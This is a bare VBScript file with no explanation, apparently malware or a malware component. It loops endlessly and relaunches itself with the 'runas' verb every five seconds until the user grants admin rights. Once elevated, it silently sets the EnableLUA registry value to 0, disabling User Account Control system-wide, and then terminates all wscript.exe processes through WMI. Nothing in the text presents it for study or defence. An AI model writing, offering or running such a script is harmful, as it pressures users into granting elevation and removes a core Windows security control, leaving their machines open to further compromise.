Set oShell = WScript.CreateObject ("WScript.Shell")
Do
If DevPoint() Then
oShell.run "C:\Windows\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", 0, True
SearchTokill("wscript.exe")
End If

If not DevPoint() Then
Shadow()
End if
Wscript.sleep(5000)
loop

sub shadow()
If WScript.Arguments.Length = 0 Then
  Set A = CreateObject("Shell.Application")
  A.ShellExecute "wscript.exe" _
    , """" & WScript.ScriptFullName & """ RunAsAdministrator", , "runas", 1
End if
end sub

Function DevPoint()
  DevPoint = False
  On Error Resume Next
  C = CreateObject("WScript.Shell").RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
  If err.number = 0 Then DevPoint = True
End Function

Sub SearchTokill(P)
    strComputer = "."
    Set B = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2") 
    Set D = B.ExecQuery ("Select * from Win32_Process Where Name like '" & P & "'")
    For Each p in D
        p.Terminate             
    Next
End Sub